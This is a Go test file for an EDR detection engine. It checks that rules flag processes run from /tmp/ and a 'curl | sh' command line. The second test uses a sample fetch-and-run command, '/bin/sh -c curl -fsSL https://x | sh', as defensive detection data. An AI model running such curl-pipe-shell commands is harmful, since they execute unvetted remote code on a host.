package detect

import (
	"testing"
	"time"

	"github.com/razatechofficial/edr/internal/rules"
	"github.com/razatechofficial/edr/internal/schema"
)

func TestEvaluateProcess(t *testing.T) {
	rs := rules.RuleSet{
		Version: "1",
		Rules: []rules.Rule{
			{
				ID:       "R1",
				Name:     "Temp execution",
				Severity: "high",
				When: struct {
					ParentIn            []string "yaml:\"parent_in\""
					ChildIn             []string "yaml:\"child_in\""
					ProcessPathContains []string "yaml:\"process_path_contains\""
					CommandLineContains []string "yaml:\"command_line_contains\""
					CommandLineAll      []string "yaml:\"command_line_all_contains\""
				}{
					CommandLineContains: []string{"/tmp/"},
				},
			},
		},
	}
	e := NewEngine(rs)
	alerts := e.EvaluateProcess(schema.ProcessEvent{
		BaseEvent: schema.BaseEvent{
			SchemaVersion: schema.SchemaVersionV1,
			EventType:     schema.EventProcess,
			EndpointID:    "ep",
			Timestamp:     time.Now(),
		},
		ProcessName: "bash",
		ProcessPath: "/bin/sh",
		CommandLine: "/bin/sh /tmp/run.sh",
		PID:         123,
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert got %d", len(alerts))
	}
	if alerts[0].Score != 80 {
		t.Fatalf("unexpected score %d", alerts[0].Score)
	}
}

func TestEvaluateProcessCommandLineAll(t *testing.T) {
	rs := rules.RuleSet{
		Version: "1",
		Rules: []rules.Rule{
			{
				ID:       "R2",
				Name:     "Curl pipe shell",
				Severity: "critical",
				When: struct {
					ParentIn            []string "yaml:\"parent_in\""
					ChildIn             []string "yaml:\"child_in\""
					ProcessPathContains []string "yaml:\"process_path_contains\""
					CommandLineContains []string "yaml:\"command_line_contains\""
					CommandLineAll      []string "yaml:\"command_line_all_contains\""
				}{
					CommandLineAll: []string{"curl", "| sh"},
				},
			},
		},
	}
	e := NewEngine(rs)
	alerts := e.EvaluateProcess(schema.ProcessEvent{
		BaseEvent: schema.BaseEvent{
			SchemaVersion: schema.SchemaVersionV1,
			EventType:     schema.EventProcess,
			EndpointID:    "ep",
			Timestamp:     time.Now(),
		},
		ProcessName: "sh",
		ProcessPath: "/bin/sh",
		CommandLine: "/bin/sh -c curl -fsSL https://x | sh",
		PID:         321,
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert got %d", len(alerts))
	}
}
